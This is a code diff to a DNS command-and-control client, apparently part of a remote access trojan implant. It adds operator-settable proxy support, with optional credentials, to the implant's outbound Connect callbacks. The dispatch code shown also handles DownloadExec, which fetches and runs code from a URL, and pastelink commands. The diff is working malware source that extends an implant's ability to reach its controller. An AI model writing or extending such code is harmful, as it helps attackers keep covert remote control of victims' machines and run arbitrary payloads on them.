@@ -108,6 +108,7 @@ class DnsCommandsClient(Thread):
         self.poll = 60
         self.active = True
         self.failed = 0
+        self.proxy = None
 
         Thread.__init__(self)
 
@@ -283,6 +284,17 @@ class DnsCommandsClient(Thread):
     def on_session_lost(self):
         pass
 
+    def on_set_proxy(self, scheme, ip, port, user, password):
+        if not scheme or scheme.lower() == 'none':
+            self.proxy = None
+        else:
+            if user and password:
+                auth = '{}:{}@'.format(user, password)
+            else:
+                auth = ''
+
+            self.proxy = '{}://{}{}:{}'.format(scheme, auth, ip, port)
+
     def process(self):
         if self.spi:
             commands = list(self._request(SystemStatus()))
@@ -324,8 +336,18 @@ class DnsCommandsClient(Thread):
                 self.on_pastelink(command.url, command.action, self.encoder)
             elif isinstance(command, DownloadExec):
                 self.on_downloadexec(command.url, command.action, command.proxy)
+            elif isinstance(command, SetProxy):
+                self.on_set_proxy(
+                    command.scheme, command.ip, command.port,
+                    command.user, command.password
+                )
             elif isinstance(command, Connect):
-                self.on_connect(command.ip, command.port, transport=command.transport)
+                self.on_connect(
+                    str(command.ip),
+                    int(command.port),
+                    transport=command.transport,
+                    proxy=self.proxy
+                )
             elif isinstance(command, Error):
                 self.on_error(command.error, command.message)
             elif isinstance(command, Disconnect):
